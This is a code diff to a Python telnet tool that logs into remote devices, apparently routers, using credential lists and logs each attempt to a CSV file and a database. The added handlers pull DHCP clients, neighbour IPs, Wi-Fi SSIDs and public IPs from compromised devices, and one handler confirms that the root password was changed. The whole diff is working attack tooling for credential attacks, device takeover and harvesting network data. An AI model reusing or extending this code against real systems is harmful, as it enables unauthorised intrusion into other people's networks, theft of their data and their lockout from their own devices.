@@ -2,20 +2,22 @@
 
 # This script perform telnet remote_sockets using socket instead of telnetlib.
 # The intention is to execute command sequences quickly.
-# Save logs and analyze output for creation of more command sequences.
+# Save, process and analyze logs output for creation of more command sequences.
+# There exist a backend storing the results of command sequences executed.
 
 import sys
 import csv
 import time
 import socket
+from psycopg2 import sql
 from datetime import datetime
 
 # Personal packages
 from utils.colors import Colors
 from commands.telnet_combinations import auth_request2
-from backend.backend import telnet_process_ips
+from backend.backend import conn_simple, login_log, process_ips, extract_ips, process_ssid, process_public_ips, update_telnet_pass
 
-auth_timeout = 1
+auth_timeout = 2
 commands_timeout = 1
 remote_sockets = list()
 
@@ -81,8 +83,12 @@ def telnet_auth_sequence(remote_host, remote_port, credentials_path, log_output=
     #login_sequence  = negotiation + login_sequence
     #login_sequence  = login_sequence + negotiation
 
-    # Receive response
-    response = socket_send_sequence(remote_socket, login_sequence, auth_timeout, True, log_output)
+    if remote_socket:
+        # Receive response
+        response = socket_send_sequence(remote_host, remote_socket, login_sequence, auth_timeout, True, log_output)
+    else:
+        print(Colors.RED + "[!] Remote socket not created!" + Colors.R)
+        return
 
     # Calculate the elapsed time even in case of remote_socket error
     elapsed_time = datetime.now() - start_time
@@ -92,16 +98,19 @@ def telnet_auth_sequence(remote_host, remote_port, credentials_path, log_output=
         response = response.decode('latin')
 
     if "Last login" in response:
-        login_data = [ remote_host, remote_port, elapsed_time, datetime.now() ]
-        login_log(login_data)   # Data is logged into a file
+        login_data = [remote_host, elapsed_time, datetime.now(), True]
+        login_log(login_data)   # Data is logged into a csv file and database
 
         if detail:
             print(Colors.GREEN + f"[!] Successful Telnet Session to [{remote_host}:{remote_port}]" + Colors.R)
             print(Colors.GREEN + "---------------------------------------------------------------------" + Colors.R)
         global_error = False
     else:
+        login_data = [remote_host, elapsed_time, datetime.now(), False ]
+        login_log(login_data)   # Data is logged into a csv file and database
+
         if detail:
-            print(Colors.RED + f"[x] Failed Telnet Session to [{remote_host}:{remote_port}]" + Colors.R)
+            print(Colors.RED + f"[x] Failed Telnet Session to [{remote_host}:{remote_port}]\n" + Colors.R)
         global_error = True
         return remote_socket
 
@@ -112,11 +121,6 @@ def telnet_auth_sequence(remote_host, remote_port, credentials_path, log_output=
     # Final return
     return remote_socket
 
-# Take a list of login data and log it for further import into a database
-def login_log(login_data, log_file='new_logins.csv'):
-    with open(log_file, mode='a', newline='') as file:
-        writer = csv.writer(file)
-        writer.writerow(login_data)
 
 
 # This methods doesn't include a timeout, it waits for all the data to be received
@@ -148,7 +152,7 @@ def socket_receive_all(remote_socket, byte_size=4096, end_marker=b"WAP>", timeou
     return buffer
 
 
-def socket_send_data(remote_socket, command, timeout=5, detail=False, max_retries=5):
+def socket_send_data(remote_ip, remote_socket, command, timeout=5, detail=False, max_retries=5):
     global global_error
 
     if remote_socket is None or remote_socket.fileno() == -1:
@@ -163,22 +167,32 @@ def socket_send_data(remote_socket, command, timeout=5, detail=False, max_retrie
             remote_socket.sendall(command)
             break
         except Exception as e:
-            print(f"[!] Error sending command: {e}")
+            #print(f"[!] Error sending command: {e}")
             continue
 
-    # Fetch remote IP address
-    remote_ip = None
-    try:
-        remote_ip = remote_socket.getpeername()[0]
-    except Exception as e:
-        print(f"[!] Error fetching remote IP: {e}")
 
     # Define command-specific actions
     decoded_command = command.rstrip().decode()
     switch = {
+        "display dhcp server user all": {
+            "expected_pattern": b"display dhcp server user all",
+            "handler": lambda response: process_ips(response, remote_ip)
+        },
         "ip neigh": {
             "expected_pattern": b"ip neigh",
-            "handler": lambda response: telnet_process_ips(response, remote_ip),  # Pass remote IP to handler
+            "handler": lambda response: extract_ips(response, remote_ip)
+        },
+        "display wifi information": {
+            "expected_pattern": b"SSID Index",
+            "handler": lambda response: process_ssid(response, remote_ip)
+        },
+        "ip route show": {
+            "expected_pattern": b"ip route show",
+            "handler": lambda response: process_public_ips(response, remote_ip)
+        },
+        "EGflFhmzQUnTc8gJlku/": {
+            "expected_pattern": b"Password of root has been modified successfully",
+            "handler": lambda response: update_telnet_pass(response, remote_ip)
         },
     }
 
@@ -215,9 +229,8 @@ def socket_send_data(remote_socket, command, timeout=5, detail=False, max_retrie
 
 # For sending list of commands. It is possible to save the output log
 # timeout works for each command in the provided commands list
-def socket_send_sequence(remote_socket, commands, timeout=1, detail=True, log_output=None, delay=2):
+def socket_send_sequence(remote_host, remote_socket, commands, timeout=1, detail=True, log_output=None, delay=2):
     global global_error
-
 
     response = b''
 
@@ -228,11 +241,11 @@ def socket_send_sequence(remote_socket, commands, timeout=1, detail=True, log_ou
     for command in commands:
         if detail and global_error is False:
             pass
-            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command:" + Colors.ORANGE + f"\n[==>] Sending:\n{command}\n" + Colors.R)
+            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command to [{Colors.GREEN}{remote_host}{Colors.BOLD_WHITE}]:" + Colors.ORANGE + f"\n[==>] Sending:\n{command}\n" + Colors.R)
 
         # Send the data to remote socket
         if global_error is False:
-            response += socket_send_data(remote_socket, command, timeout, detail)
+            response += socket_send_data(remote_host, remote_socket, command, timeout, detail)
 
         time.sleep(delay)
         cont += 1
@@ -284,10 +297,11 @@ def socket_send_command(remote_socket, command, detail=False):
 def socket_send_commands(remote_socket, commands, timeout, detail=True):    # There's not a timeout here
 
     cont = 1
+    host = None
     response = b''
     for command in commands:
         if detail:
-            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command:" + Colors.ORANGE + f"\n{command}\n" + Colors.R)
+            print(Colors.BOLD_WHITE + f"[{cont}] Sending this command to [{host}]:" + Colors.ORANGE + f"\n{command}\n" + Colors.R)
             pass
         remote_socket.sendall(command)
 
